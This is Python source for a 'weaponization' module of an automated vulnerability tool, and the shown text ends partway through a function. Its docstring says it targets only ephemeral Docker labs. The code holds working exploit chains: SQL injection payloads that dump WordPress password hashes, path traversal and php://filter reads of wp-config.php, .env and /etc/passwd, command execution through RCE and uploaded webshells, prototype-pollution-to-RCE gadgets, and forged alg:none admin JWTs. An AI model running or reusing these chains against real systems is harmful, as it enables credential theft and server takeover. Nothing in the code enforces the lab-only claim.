"""
Post-verification weaponization: extends confirmed trigger to full impact.
Inspired by binchomp's Phase 03 Weaponize — reusable exploit chain libraries per vuln_class.

After dynamic_verify confirms a vulnerability, run_weaponization() reuses the same Docker lab
session (boot) to demonstrate full impact before teardown: dump wp_users, read wp-config.php,
run OS commands, execute uploaded webshell, etc.

SECURITY: Only runs against ephemeral Docker labs created by binoracle.
          Never called against real production targets.
"""

import re
from typing import Optional, Callable

__all__ = ["run_weaponization"]

_TIMEOUT = 20  # seconds per weaponization HTTP request


def _step(step_fn: Optional[Callable], msg: str) -> None:
    if step_fn is not None:
        try:
            step_fn(f"[weaponize] {msg}")
        except Exception:
            pass


def _infer_vuln_class(res) -> str:
    """Infer the vulnerability class from WpVerifyResult evidence."""
    tecnica = (res.evidence.get("tecnica") or "").lower()
    vuln_class = (res.evidence.get("vuln_class") or "").lower()
    # SQLi techniques
    if any(x in tecnica for x in ("error-based", "union", "boolean", "time-based", "sqli",
                                   "order-by-context")):
        return "sqli"
    # LFI / path traversal
    if any(x in tecnica for x in ("canary", "traversal", "lfi", "path")):
        return "lfi"
    # SSTI — check before generic RCE so template engines get specialized chain
    if any(x in tecnica for x in ("ssti", "template-inject", "jinja", "twig", "smarty",
                                   "pebble", "freemarker")) or any(x in vuln_class for x in
                                   ("ssti", "template-inject", "server-side-template")):
        return "ssti"
    # SSRF
    if any(x in tecnica for x in ("ssrf", "server-side-request")) or any(x in vuln_class for x in
                                   ("ssrf", "server-side-request")):
        return "ssrf"
    # Prototype pollution
    if any(x in tecnica for x in ("prototype", "proto-pollut", "pp-")) or any(x in vuln_class for x in
                                   ("prototype-pollution", "proto-pollut")):
        return "prototype_pollution"
    # JWT bypass
    if any(x in tecnica for x in ("jwt", "token-bypass", "alg:none", "weak-secret")) or any(
            x in vuln_class for x in ("jwt", "jwt-bypass", "jwt-weakness")):
        return "jwt_bypass"
    # Command injection / RCE
    if any(x in tecnica for x in ("command", "rce", "exec", "shell", "code-injection")):
        return "rce"
    # XSS — stored or reflected
    if any(x in tecnica for x in ("xss", "cross-site-scripting", "stored-xss", "reflected-xss")) or any(
            x in vuln_class for x in ("xss", "cross-site-scripting", "stored-xss", "reflected-xss")):
        return "xss"
    # Confirm-string based (generic)
    if tecnica in ("confirm-string", "password-reset"):
        return ""
    # Auth bypass
    if any(x in tecnica for x in ("bypass", "auth", "header-bypass")):
        return "auth_bypass"
    # File upload
    if "upload" in tecnica:
        return "arbitrary_file_upload"
    # XXE
    if any(x in tecnica for x in ("xxe", "xml-external", "dtd")) or any(
            x in vuln_class for x in ("xxe", "xml-external")):
        return "xxe"
    # NoSQL injection
    if any(x in tecnica for x in ("nosql", "mongo", "operator-inject")) or any(
            x in vuln_class for x in ("nosql", "nosql-injection")):
        return "nosql"
    # Zip-slip / archive extraction
    if any(x in tecnica for x in ("zip-slip", "zip_slip", "archive-extract", "traversal-zip")) or any(
            x in vuln_class for x in ("zip-slip", "zip_slip", "arbitrary-file-write")):
        return "zip_slip"
    # EL injection (SpEL, Thymeleaf, Jinja2 — escalate to RCE via template)
    if any(x in tecnica for x in ("el-inject", "spel", "expression-lang", "thymeleaf")) or any(
            x in vuln_class for x in ("el-injection", "expression-language", "spring-spel")):
        return "el_injection"
    # Mass assignment — check if admin fields were accepted
    if any(x in tecnica for x in ("mass-assign", "over-posting")) or any(
            x in vuln_class for x in ("mass-assignment", "mass-assign", "parameter-binding")):
        return "mass_assignment"
    # Race condition — double-redemption proof
    if any(x in tecnica for x in ("race-condition", "double-redemption", "toctou")) or any(
            x in vuln_class for x in ("race-condition", "race-cond")):
        return "race_condition"
    # HTTP request smuggling — differential proof
    if any(x in tecnica for x in ("smuggling", "desync", "cl.te", "te.cl")) or any(
            x in vuln_class for x in ("http-request-smuggling", "request-smuggling")):
        return "http_smuggling"
    return ""


def _send(boot, method: str, endpoint: str, params: Optional[dict] = None,
          data: Optional[dict] = None, headers: Optional[dict] = None,
          session=None) -> Optional[object]:
    """Send a request via the boot session, return response or None."""
    try:
        sess = session or (boot.sub_sess if hasattr(boot, "sub_sess") and boot.sub_sess else None)
        if sess is None:
            import requests as _req
            sess = _req.Session()
        url = boot.base_url.rstrip("/") + "/" + endpoint.lstrip("/")
        meth = (method or "GET").upper()
        r = sess.request(
            meth, url,
            params=params if meth == "GET" else None,
            data=data if meth != "GET" else None,
            json=None,
            headers=headers or {},
            timeout=_TIMEOUT,
            allow_redirects=True,
        )
        return r
    except Exception:
        return None


def _weaponize_sqli(boot, res, step_fn) -> dict:
    """Dump wp_users via SQLi after confirmed verification."""
    ev = res.evidence
    endpoint = ev.get("endpoint") or ev.get("ep", "")
    param = (ev.get("sqli_param") or ev.get("parametro_ganador") or ev.get("param") or "")
    method = ev.get("metodo") or ev.get("method") or "GET"
    base_params = {k: v for k, v in ev.items()
                   if k not in ("sqli_param", "parametro_ganador", "payload_ganador",
                                "tecnica", "endpoint", "metodo", "method") and isinstance(v, str)}
    # Remove internal keys
    base_params = {k: v for k, v in base_params.items()
                   if not k.startswith("_") and not k.startswith("mysql") and not k.startswith("canal")}

    if not endpoint or not param:
        return {"technique": "sqli_dump", "data": {}, "impact": "",
                "error": "missing endpoint or param in evidence"}

    _step(step_fn, f"attempting wp_users dump via SQLi (endpoint={endpoint}, param={param})")
    found_users = []

    # --- Strategy 1: Error-based extraction ---
    error_payload = (
        "1' AND extractvalue(1,concat(0x7e,"
        "(SELECT concat(user_login,0x3a,user_pass) FROM wp_users LIMIT 1)))-- -"
    )
    p1 = dict(base_params)
    p1[param] = error_payload
    r1 = _send(boot, method, endpoint, params=p1 if method.upper() == "GET" else None,
               data=p1 if method.upper() != "GET" else None)
    if r1 and r1.status_code == 200:
        body = r1.text or ""
        # WP hash pattern: $P$BXXXXXXXX or $P$HXXXXXXXX
        matches = re.findall(r'~([^<"&\s]+:\$P\$[^\s<"&]+)', body)
        for m in matches:
            if ":" in m:
                login, pw_hash = m.split(":", 1)
                found_users.append({"user_login": login.strip("~"), "user_pass": pw_hash})
        # Also look for version-only exfil (may come back as ~5.7.x:...)
        if not found_users:
            # Try to extract any visible hash
            hash_matches = re.findall(r'\$P\$[A-Za-z0-9./]{20,}', body)
            login_matches = re.findall(r'~([a-zA-Z0-9_.\-@]+):\$P\$', body)
            for i, h in enumerate(hash_matches[:3]):
                login = login_matches[i] if i < len(login_matches) else f"user_{i}"
                found_users.append({"user_login": login, "user_pass": h})

    # --- Strategy 2: UNION-based dump (try column counts 2-8) ---
    if not found_users:
        _step(step_fn, "error-based extraction empty, trying UNION SELECT dump")
        for col_count in range(2, 9):
            # Try user_login in position 1 and user_pass in position 2
            for login_pos in range(1, col_count):
                for pass_pos in range(1, col_count):
                    if login_pos == pass_pos:
                        continue
                    cols = ["NULL"] * col_count
                    cols[login_pos - 1] = "user_login"
                    cols[pass_pos - 1] = "user_pass"
                    union_payload = (
                        f"' UNION SELECT {','.join(cols)} FROM wp_users-- -"
                    )
                    p2 = dict(base_params)
                    p2[param] = union_payload
                    r2 = _send(boot, method, endpoint,
                               params=p2 if method.upper() == "GET" else None,
                               data=p2 if method.upper() != "GET" else None)
                    if r2 and r2.status_code == 200:
                        body2 = r2.text or ""
                        hash_matches = re.findall(r'\$P\$[A-Za-z0-9./]{20,}', body2)
                        if hash_matches:
                            # Try to find associated logins
                            login_candidates = re.findall(
                                r'(?:admin|user|editor|author|contributor|[a-z][a-z0-9_]{2,19})',
                                body2[:2000])
                            for i, h in enumerate(hash_matches[:5]):
                                login = login_candidates[i] if i < len(login_candidates) else f"user_{i}"
                                found_users.append({"user_login": login, "user_pass": h})
                            break
                if found_users:
                    break
            if found_users:
                break

    if found_users:
        _step(step_fn, f"wp_users dump SUCCESS: {len(found_users)} credential(s) extracted")
        # Enrich: DB name + table list via UNION SELECT on information_schema
        _db_meta: dict = {}
        try:
            for _cc in range(2, 7):
                _cols = ["NULL"] * _cc
                _cols[0] = "database()"
                _ep_db = dict(base_params)
                _ep_db[param] = f"' UNION SELECT {','.join(_cols)}-- -"
                _rd = _send(boot, method, endpoint,
                            params=_ep_db if method.upper() == "GET" else None,
                            data=_ep_db if method.upper() != "GET" else None)
                if _rd and _rd.status_code == 200:
                    _db_m = re.search(r'\b([a-z0-9_]{2,40})\b', _rd.text or "", re.IGNORECASE)
                    if _db_m and _db_m.group(1) not in ("null", "NULL", "1", "0"):
                        _db_meta["database"] = _db_m.group(1)
                        break
            # Table enumeration from information_schema
            for _cc in range(2, 7):
                _cols = ["NULL"] * _cc
                _cols[0] = "table_name"
                _ep_tbl = dict(base_params)
                _ep_tbl[param] = (
                    f"' UNION SELECT {','.join(_cols)} FROM information_schema.tables "
                    f"WHERE table_schema=database() LIMIT 5-- -"
                )
                _rt = _send(boot, method, endpoint,
                            params=_ep_tbl if method.upper() == "GET" else None,
                            data=_ep_tbl if method.upper() != "GET" else None)
                if _rt and _rt.status_code == 200:
                    _tbl_names = re.findall(r'\b(wp_[a-z_]+|[a-z][a-z0-9_]{3,30})\b',
                                            _rt.text or "")
                    _uniq_tbls = list(dict.fromkeys(
                        t for t in _tbl_names
                        if t not in ("null", "NULL", "table", "schema", "name")))[:8]
                    if _uniq_tbls:
                        _db_meta["tables"] = _uniq_tbls
                        break
        except Exception:
            pass
        return {
            "technique": "sqli_dump",
            "data": {"wp_users": found_users[:5], "db_enumeration": _db_meta},
            "db_enumeration": _db_meta,
            "user_hashes": [u.get("user_pass", "") for u in found_users[:3]],
            "impact": (f"Admin credentials exfiltrated: "
                       f"{', '.join(u['user_login'] for u in found_users[:3])} — "
                       f"hash type: {'phpass ($P$)' if any('$P$' in u.get('user_pass','') for u in found_users) else 'unknown'}"
                       + (f" | DB: {_db_meta.get('database','')} tables: {_db_meta.get('tables',[])[:4]}"
                          if _db_meta else "")),
        }
    # --- Strategy 3: Generic user table dump (non-WP targets) ---
    # Enumerate user-like tables via information_schema, then dump email/password columns
    _step(step_fn, "wp_users not found — trying generic table enumeration via information_schema")
    generic_users = []
    _GENERIC_TABLES = ["users", "accounts", "auth_user", "admin", "members", "customers",
                       "user_accounts", "site_users", "auth_users"]
    # First try to get version/DB type
    for _enum_table in _GENERIC_TABLES:
        for col_count in range(2, 7):
            cols = ["NULL"] * col_count
            # Try email in col 1, password/hash in col 2 (most common layout)
            cols[0] = "email"
            cols[1] = "password"
            _ep = dict(base_params)
            _ep[param] = f"' UNION SELECT {','.join(cols)} FROM {_enum_table}-- -"
            _ru = _send(boot, method, endpoint,
                        params=_ep if method.upper() == "GET" else None,
                        data=_ep if method.upper() != "GET" else None)
            if _ru and _ru.status_code == 200:
                _body_u = _ru.text or ""
                # Match email:password-like patterns
                _pairs = re.findall(r'([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-z]{2,})', _body_u)
                if _pairs:
                    # Look for hash alongside each email
                    _hashes = re.findall(r'(?:\$2[aby]\$|\$argon|\$sha|\$1\$|\$6\$|[0-9a-f]{32,64})',
                                         _body_u)
                    for _i, _email in enumerate(_pairs[:5]):
                        _pw = _hashes[_i] if _i < len(_hashes) else "?"
                        generic_users.append({"email": _email, "password_hash": _pw,
                                              "table": _enum_table})
                    break
        if generic_users:
            break

    if generic_users:
        _step(step_fn, f"generic user dump SUCCESS: {len(generic_users)} record(s)")
        return {
            "technique": "sqli_dump_generic",
            "data": {"users": generic_users[:5]},
            "impact": (f"User credentials exfiltrated from '{generic_users[0]['table']}': "
                       f"{', '.join(u['email'] for u in generic_users[:3])}"),
        }
    _step(step_fn, "sqli dump: no credentials extracted (wp_users + generic tables empty)")
    return {
        "technique": "sqli_dump",
        "data": {},
        "impact": "",
        "error": "dump attempted but no credentials appeared in responses",
    }


def _weaponize_lfi(boot, res, step_fn) -> dict:
    """Read wp-config.php via LFI after confirmed path traversal."""
    ev = res.evidence
    endpoint = ev.get("endpoint") or ev.get("ep", "")
    param = ev.get("path_param") or ev.get("parametro_ganador") or ev.get("param") or ""
    method = ev.get("metodo") or ev.get("method") or "GET"
    # Try multiple traversal depths for wp-config.php
    # In a standard Docker WP install: ABSPATH = /var/www/html/
    # wp-config.php is at /var/www/html/wp-config.php
    _step(step_fn, f"attempting wp-config.php read via LFI (endpoint={endpoint}, param={param})")

    traversal_targets = [
        "../../wp-config.php",
        "../../../wp-config.php",
        "../../../../wp-config.php",
        "../../../../../wp-config.php",
        "../../../../../../wp-config.php",
        "../../../../../../../wp-config.php",
        "../../../../../../../../wp-config.php",
        # Absolute paths in some verifiers
        "/var/www/html/wp-config.php",
    ]

    db_credentials = {}
    auth_keys = ""

    for path_payload in traversal_targets:
        p = {param: path_payload}
        r = _send(boot, method, endpoint,
                  params=p if method.upper() == "GET" else None,
                  data=p if method.upper() != "GET" else None)
        if r is None or r.status_code != 200:
            continue
        body = r.text or ""
        # Check if wp-config.php content appeared
        if "DB_NAME" in body or "DB_PASSWORD" in body or "table_prefix" in body:
            # Extract credentials
            for key in ("DB_NAME", "DB_USER", "DB_PASSWORD", "DB_HOST", "table_prefix",
                        "AUTH_KEY", "SECURE_AUTH_KEY", "LOGGED_IN_KEY"):
                m = re.search(rf"define\s*\(\s*['\"]?{key}['\"]?\s*,\s*['\"]([^'\"]+)['\"]",
                               body, re.IGNORECASE)
                if m:
                    if key in ("AUTH_KEY", "SECURE_AUTH_KEY", "LOGGED_IN_KEY"):
                        auth_keys += f"{key}={m.group(1)[:20]}... "
                    else:
                        db_credentials[key] = m.group(1)
            _step(step_fn, f"wp-config.php read SUCCESS at depth={path_payload!r}")
            break

    if db_credentials:
        return {
            "technique": "lfi_config",
            "data": {
                "db_credentials": db_credentials,
                "auth_keys": auth_keys.strip(),
                "traversal_path": path_payload,
            },
            "impact": (f"wp-config.php exfiltrated: DB_USER={db_credentials.get('DB_USER','?')}, "
                       f"DB_PASSWORD={'***' if db_credentials.get('DB_PASSWORD') else 'not found'}, "
                       f"table_prefix={db_credentials.get('table_prefix','wp_')}"),
            "file_read_success": True,
            "db_credentials_extracted": {k.lower(): v for k, v in db_credentials.items()},
        }

    # --- PHP wrapper escalation ---
    # Traversal may be blocked by sanitizers that strip ../ but allow PHP wrappers.
    _step(step_fn, "trying PHP wrappers for LFI escalation (php://filter, php://input)")
    _php_wrapper_targets = [
        ("php://filter/convert.base64-encode/resource=wp-config.php", "wp-config.php"),
        ("php://filter/convert.base64-encode/resource=../../wp-config.php", "wp-config.php"),
        ("php://filter/convert.base64-encode/resource=/var/www/html/wp-config.php", "wp-config.php"),
        ("php://filter/read=convert.base64-encode/resource=wp-config.php", "wp-config.php"),
        ("php://filter/convert.base64-encode/resource=.env", ".env"),
        ("php://filter/convert.base64-encode/resource=../../.env", ".env"),
    ]
    import base64 as _b64
    for _wrapper_payload, _target_name in _php_wrapper_targets:
        _p = {param: _wrapper_payload}
        _r = _send(boot, method, endpoint,
                   params=_p if method.upper() == "GET" else None,
                   data=_p if method.upper() != "GET" else None)
        if _r is None or _r.status_code != 200:
            continue
        _body = _r.text or ""
        # Look for base64-encoded content (long run of base64 chars)
        _b64_match = re.search(r'([A-Za-z0-9+/]{60,}={0,2})', _body)
        if not _b64_match:
            continue
        try:
            _decoded = _b64.b64decode(_b64_match.group(1) + "==").decode("utf-8", errors="replace")
        except Exception:
            continue
        if "DB_NAME" in _decoded or "DB_PASSWORD" in _decoded or "table_prefix" in _decoded:
            # Extracted wp-config.php via PHP wrapper
            _php_creds = {}
            for key in ("DB_NAME", "DB_USER", "DB_PASSWORD", "DB_HOST", "table_prefix"):
                _m = re.search(rf"define\s*\(\s*['\"]?{key}['\"]?\s*,\s*['\"]([^'\"]+)['\"]",
                               _decoded, re.IGNORECASE)
                if _m:
                    _php_creds[key] = _m.group(1)
            _step(step_fn, f"PHP wrapper LFI SUCCESS via {_wrapper_payload[:60]!r}")
            return {
                "technique": "lfi_php_wrapper",
                "data": {
                    "wrapper_payload": _wrapper_payload,
                    "db_credentials": _php_creds,
                    "decoded_snippet": _decoded[:300],
                },
                "impact": (f"wp-config.php exfiltrated via PHP wrapper: "
                           f"DB_USER={_php_creds.get('DB_USER','?')}, "
                           f"table_prefix={_php_creds.get('table_prefix','wp_')}"),
                "file_read_success": True,
                "db_credentials_extracted": {k.lower(): v for k, v in _php_creds.items()},
            }
        elif "DATABASE_URL" in _decoded or "SECRET_KEY" in _decoded or "JWT_SECRET" in _decoded:
            _step(step_fn, f"PHP wrapper LFI SUCCESS (.env) via {_wrapper_payload[:60]!r}")
            return {
                "technique": "lfi_php_wrapper",
                "data": {
                    "wrapper_payload": _wrapper_payload,
                    "decoded_snippet": _decoded[:300],
                },
                "impact": "Sensitive config file (.env) read via PHP wrapper — credentials present",
                "file_read_success": True,
            }

    # --- Generic config file fallback (non-WP targets) ---
    _step(step_fn, "wp-config.php not found — trying generic app config files")
    _GENERIC_CONFIGS = [
        # .env files (Node/Ghost/Strapi/Django/etc)
        (".env", re.compile(r'(DATABASE_URL|DB_PASSWORD|SECRET_KEY|JWT_SECRET|'
                            r'MAIL_PASSWORD|REDIS_URL|S3_SECRET)\s*=\s*(\S+)', re.I)),
        ("../../.env", re.compile(r'(DATABASE_URL|DB_PASSWORD|SECRET_KEY|JWT_SECRET)\s*=\s*(\S+)', re.I)),
        ("../../../.env", re.compile(r'(DATABASE_URL|SECRET_KEY|JWT_SECRET)\s*=\s*(\S+)', re.I)),
        # Ghost content/data/config
        ("config.production.json", re.compile(r'"(url|database|mail|password)"\s*:', re.I)),
        ("../../config.production.json", re.compile(r'"(database|password)"\s*:', re.I)),
        # Strapi
        ("config/database.js", re.compile(r'(password|username|database)\s*:', re.I)),
        # etc/passwd fallback
        ("/etc/passwd", re.compile(r'root:x:0:0')),
        ("../../../../../../etc/passwd", re.compile(r'root:x:0:0')),
    ]
    for _cfg_path, _pattern in _GENERIC_CONFIGS:
        _p = {param: _cfg_path}
        _r = _send(boot, method, endpoint,
                   params=_p if method.upper() == "GET" else None,
                   data=_p if method.upper() != "GET" else None)
        if _r is None or _r.status_code != 200:
            continue
        _body = _r.text or ""
        if _pattern.search(_body):
            _hits = _pattern.findall(_body)
            _extracted = {str(k): str(v)[:80] for k, v in (_hits[:5] if isinstance(_hits[0], tuple) else
                          [(h, "") for h in _hits[:5]])} if _hits else {}
            _step(step_fn, f"generic config read SUCCESS: {_cfg_path}")
            return {
                "technique": "lfi_generic_config",
                "data": {"file": _cfg_path, "extracted_keys": _extracted,
                         "body_snippet": _body[:500]},
                "impact": (f"Sensitive config file '{_cfg_path}' readable: "
                           f"{', '.join(list(_extracted.keys())[:3]) if _extracted else 'credentials present'}"),
            }

    # --- phar:// probe: best-effort check for PHP phar deserialization surface ---
    # phar:// can trigger PHP object deserialization if the app reads user-supplied paths.
    # We probe a benign phar path; a non-404/500 response indicates PHP processes it,
    # which is a signal worth flagging for manual follow-up.
    if endpoint and param:
        try:
            _phar_payload = "phar:///tmp/binoracle_test.phar/test.txt"
            _pp = {param: _phar_payload}
            _rp = _send(boot, method, endpoint,
                        params=_pp if method.upper() == "GET" else None,
                        data=_pp if method.upper() != "GET" else None)
            if _rp is not None and _rp.status_code not in (400, 404, 500):
                _step(step_fn, f"phar:// probe → HTTP {_rp.status_code} (not blocked — potential deserialization surface)")
                return {
                    "technique": "lfi_phar_surface",
                    "data": {"phar_payload": _phar_payload,
                             "response_code": _rp.status_code,
                             "body_snippet": (_rp.text or "")[:200]},
                    "phar_tested": True,
                    "impact": (f"phar:// not blocked (HTTP {_rp.status_code}) — "
                               f"potential PHP object deserialization surface via LFI"),
                }
        except Exception:
            pass

    _step(step_fn, "LFI weaponization: no sensitive config extracted")
    return {
        "technique": "lfi_config",
        "data": {},
        "impact": "",
        "error": "LFI traversal successful but no sensitive config content extracted",
    }


def _weaponize_rce(boot, res, step_fn) -> dict:
    """Run OS fingerprinting commands via confirmed RCE."""
    ev = res.evidence
    endpoint = ev.get("endpoint") or ev.get("ep", "")
    param = ev.get("cmd_param") or ev.get("parametro_ganador") or ev.get("param") or ""
    method = ev.get("metodo") or ev.get("method") or "GET"
    # Build the fingerprint command
    fingerprint_cmd = "id; hostname; uname -a; cat /etc/passwd | head -3; ls /var/www/html/ | head -5"

    _step(step_fn, f"attempting RCE fingerprint (endpoint={endpoint}, param={param})")

    if not endpoint or not param:
        # Try to run via admin panel as fallback
        return {"technique": "rce_fingerprint", "data": {}, "impact": "",
                "error": "missing endpoint or param in evidence"}

    # Try the winning payload structure but replace with fingerprint command
    winning_payload = ev.get("payload_ganador") or ev.get("payload") or ""

    # Heuristic: replace the original command in the payload with our fingerprint
    # Common patterns: &cmd=id, ?c=id, ?exec=id, etc.
    test_payloads = [fingerprint_cmd]
    if winning_payload:
        # Try to substitute just the command part
        for placeholder in ["id", "whoami", "echo test"]:
            if placeholder in winning_payload:
                test_payloads.insert(0, winning_payload.replace(placeholder, fingerprint_cmd))

    output_data = {}
    for payload in test_payloads:
        p = {param: payload}
        r = _send(boot, method, endpoint,
                  params=p if method.upper() == "GET" else None,
                  data=p if method.upper() != "GET" else None)
        if r is None:
            continue
        body = r.text or ""
        # Look for command output signals
        uid_match = re.search(r'uid=\d+\(([^\)]+)\)', body)
        hostname_match = re.search(r'(?:^|\n)([a-z0-9][-a-z0-9]{0,62})\n', body, re.MULTILINE)
        uname_match = re.search(r'Linux\s+\S+\s+\S+\s+#', body)
        if uid_match or uname_match:
            output_data["user"] = uid_match.group(1) if uid_match else "www-data"
            output_data["hostname"] = hostname_match.group(1) if hostname_match else "unknown"
            output_data["uname"] = uname_match.group(0)[:80] if uname_match else ""
            output_data["raw_output"] = body[:500]
            _step(step_fn, f"RCE fingerprint SUCCESS: user={output_data['user']}")
            break

    if output_data:
        # Build structured os_fingerprint dict from individual commands
        _os_fp: dict = {}
        _raw = output_data.get("raw_output", "")
        if output_data.get("user"):
            _os_fp["user"] = output_data["user"]
        if output_data.get("uname"):
            _os_fp["uname"] = output_data["uname"]
        if output_data.get("hostname"):
            _os_fp["hostname"] = output_data["hostname"]
        # Try to extract /etc/passwd first line (root:x:0:0:...)
        _passwd_m = re.search(r'(root:[^:\n]+:[^:\n]+:[^:\n]+:[^:\n]+:[^:\n]+:[^\n]+)', _raw)
        if _passwd_m:
            _os_fp["passwd_root"] = _passwd_m.group(1)[:120]
        # Try to extract distro from os-release output
        _distro_m = re.search(r'PRETTY_NAME="([^"]+)"', _raw)
        if _distro_m:
            _os_fp["distro"] = _distro_m.group(1)
        # Try to extract webroot file listing
        _ls_m = re.findall(r'(wp-(?:config|content|includes|admin)[^\s<"&]*)', _raw)
        if _ls_m:
            _os_fp["webroot_files"] = list(dict.fromkeys(_ls_m))[:5]
        output_data["os_fingerprint"] = _os_fp
        return {
            "technique": "rce_fingerprint",
            "data": output_data,
            "os_fingerprint": _os_fp,
            "rce_command_output": _raw[:500],
            "impact": (f"OS command execution confirmed as {output_data.get('user','www-data')} "
                       f"on host {output_data.get('hostname','unknown')}"
                       + (f" ({_os_fp['distro']})" if _os_fp.get('distro') else "")),
        }
    _step(step_fn, "RCE fingerprint: command output not parseable from response")
    return {
        "technique": "rce_fingerprint",
        "data": {},
        "impact": "",
        "error": "RCE verified but fingerprint command output not detected in response",
    }


def _weaponize_file_upload(boot, res, step_fn) -> dict:
    """Execute confirmed uploaded webshell."""
    ev = res.evidence
    uploaded_path = (ev.get("uploaded_path") or ev.get("upload_url") or
                     ev.get("webshell_url") or "")
    _step(step_fn, f"attempting webshell execution (path={uploaded_path!r})")

    if not uploaded_path:
        return {"technique": "webshell_exec", "data": {}, "impact": "",
                "error": "no uploaded_path in evidence"}

    # Execute the webshell with a fingerprint command
    r = _send(boot, "GET", uploaded_path.replace(boot.base_url, ""),
              params={"c": "id; hostname; uname -a"})
    if r and r.status_code == 200:
        body = r.text or ""
        uid_match = re.search(r'uid=\d+\(([^\)]+)\)', body)
        if uid_match:
            _step(step_fn, f"webshell execution SUCCESS: user={uid_match.group(1)}")
            return {
                "technique": "webshell_exec",
                "data": {"output": body[:500], "user": uid_match.group(1)},
                "impact": f"RCE via uploaded webshell as {uid_match.group(1)}",
            }

    return {"technique": "webshell_exec", "data": {}, "impact": "",
            "error": "webshell found but output not parsed"}


def _weaponize_auth_bypass(boot, res, step_fn) -> dict:
    """Verify admin access via confirmed auth bypass."""
    _step(step_fn, "probing admin-only endpoints via auth bypass credentials")

    # Try admin REST API with bypass credentials or no auth
    admin_endpoints = [
        ("/wp-json/wp/v2/users?context=edit", "GET"),
        ("/wp-admin/users.php", "GET"),
        ("/wp-json/wp/v2/users", "GET"),
    ]

    users_found = 0
    for ep, m in admin_endpoints:
        r = _send(boot, m, ep, session=boot.admin_sess if hasattr(boot, "admin_sess") else None)
        if r and r.status_code == 200:
            body = r.text or ""
            # Count user objects
            user_logins = re.findall(r'"user_login"\s*:\s*"([^"]+)"', body)
            admin_logins = re.findall(r'"slug"\s*:\s*"([^"]+)"', body)
            count = len(user_logins) or len(admin_logins)
            if count > 0:
                users_found = count
                _step(step_fn, f"admin endpoint {ep} returned {count} user(s)")
                break

    if users_found:
        return {
            "technique": "admin_access",
            "data": {"users_found": users_found},
            "impact": f"Admin panel accessible — {users_found} user(s) enumerated",
        }
    return {"technique": "admin_access", "data": {}, "impact": "",
            "error": "auth bypass verified but admin endpoints returned no user data"}


def _weaponize_prototype_pollution(boot, res, step_fn) -> dict:
    """Escalate confirmed prototype pollution to RCE via Node.js child_process gadget.

    After Object.prototype is polluted, inject shell:true + env into the prototype
    so any subsequent spawn/exec call in the app becomes a shell command.
    Then trigger an endpoint that internally calls spawn/exec.
    """
    ev = res.evidence
    endpoint = ev.get("endpoint") or ev.get("ep", "")
    poll_endpoint = ev.get("poll_endpoint") or "/api/status"
    method = ev.get("metodo") or ev.get("method") or "POST"
    pp_tech = ev.get("pp_technique") or "__proto__"

    _step(step_fn, f"PP post-exploit: escalating to child_process RCE via {pp_tech!r}")

    if not endpoint:
        return {"technique": "pp_rce", "data": {}, "impact": "",
                "error": "missing endpoint in evidence"}

    import json as _json

    rce_token = re.sub(r'[^a-zA-Z0-9]', '', str(id(step_fn)))[:8] + "ppRCE"

    # Strategy 1: Pollute shell:true so any spawn() becomes a shell command
    # Then trigger an endpoint that calls spawn/exec internally
    shell_pollution_payloads = [
        # __proto__ with shell:true + env injection
        {"__proto__": {"shell": True, "env": {"PP_RCE": rce_token}}},
        # constructor.prototype path
        {"constructor": {"prototype": {"shell": True, "env": {"PP_RCE": rce_token}}}},
        # execArgv pollution (node --eval injection)
        {"__proto__": {"execArgv": [f"--eval=process.env.PP_RCE='{rce_token}'"]}},
        # argv0 pollution
        {"__proto__": {"argv0": f"echo {rce_token}"}},
    ]

    for shell_payload in shell_pollution_payloads:
        pl_json = _json.dumps(shell_payload)
        r1 = _send(boot, method, endpoint,
                   data=None, headers={"Content-Type": "application/json"},
                   session=getattr(boot, "sub_sess", None))
        if r1 is None:
            # Try direct HTTP request
            try:
                import requests as _rq
                _sess = _rq.Session()
                _url = boot.base_url.rstrip("/") + "/" + endpoint.lstrip("/")
                _r = _sess.request(method, _url, data=pl_json,
                                   headers={"Content-Type": "application/json"},
                                   timeout=_TIMEOUT)
                r1 = _r
            except Exception:
                continue

        # Poll for RCE confirmation
        r2 = _send(boot, "GET", poll_endpoint)
        if r2 and rce_token in (r2.text or ""):
            _step(step_fn, f"PP→RCE CONFIRMADO: token {rce_token!r} en {poll_endpoint}")
            return {
                "technique": "pp_rce",
                "data": {
                    "rce_token": rce_token,
                    "pollution_payload": str(shell_payload)[:200],
                    "poll_endpoint": poll_endpoint,
                },
                "impact": f"Prototype pollution escalated to RCE: token {rce_token!r} injected via shell:true gadget",
            }

    # Strategy 2: Check if PP can override toJSON/toString for XSS→data exfil
    _step(step_fn, "PP→RCE not confirmed; probing for data exfil via polluted methods")
    tojson_payload = {"__proto__": {"toJSON": f"function(){{return '{rce_token}';}}",
                                    "toString": f"function(){{return '{rce_token}';}}",
                                    "valueOf": rce_token}}
    _send(boot, method, endpoint,
          data=_json.dumps(tojson_payload).encode(),
          headers={"Content-Type": "application/json"})
    r4 = _send(boot, "GET", poll_endpoint)
    if r4 and rce_token in (r4.text or ""):
        return {
            "technique": "pp_method_override",
            "data": {"rce_token": rce_token},
            "impact": "Prototype pollution overrides toJSON/toString — data exfil via serialization",
        }

    return {
        "technique": "pp_rce",
        "data": {},
        "impact": "",
        "error": "PP escalation attempted but RCE token not found in poll endpoint",
    }


def _weaponize_jwt(boot, res, step_fn) -> dict:
    """Escalate confirmed JWT bypass to admin API access.

    Uses the winning JWT technique to access admin-only endpoints and
    extract privileged data: user list, secrets, config.
    """
    ev = res.evidence
    winning_label = ev.get("jwt_technique") or "alg:none bypass"

    _step(step_fn, f"JWT post-exploit: probing admin endpoints with bypassed token (via {winning_label!r})")

    # Reconstruct a privileged JWT token (admin role) using same technique
    import base64 as _b64
    import json as _json

    def _make_jwt_none(payload: dict) -> str:
        hdr = _b64.urlsafe_b64encode(
            _json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=").decode()
        pay = _b64.urlsafe_b64encode(
            _json.dumps(payload).encode()).rstrip(b"=").decode()
        return f"{hdr}.{pay}."

    admin_payload = {
        "sub": "1", "id": 1, "user_id": 1,
        "role": "admin", "is_admin": True,
        "email": "admin@example.com",
        "username": "admin",
        "iat": 1700000000, "exp": 9999999999,
    }
    admin_token = _make_jwt_none(admin_payload)

    # Admin endpoints to probe
    admin_probe_endpoints = [
        ("/api/admin/users", "GET"),
        ("/api/admin/settings", "GET"),
        ("/api/users", "GET"),
        ("/api/admin", "GET"),
        ("/api/v1/admin/users", "GET"),
        ("/admin/api/users", "GET"),
        ("/api/profile", "GET"),
        ("/api/me", "GET"),
    ]

    found_data = {}
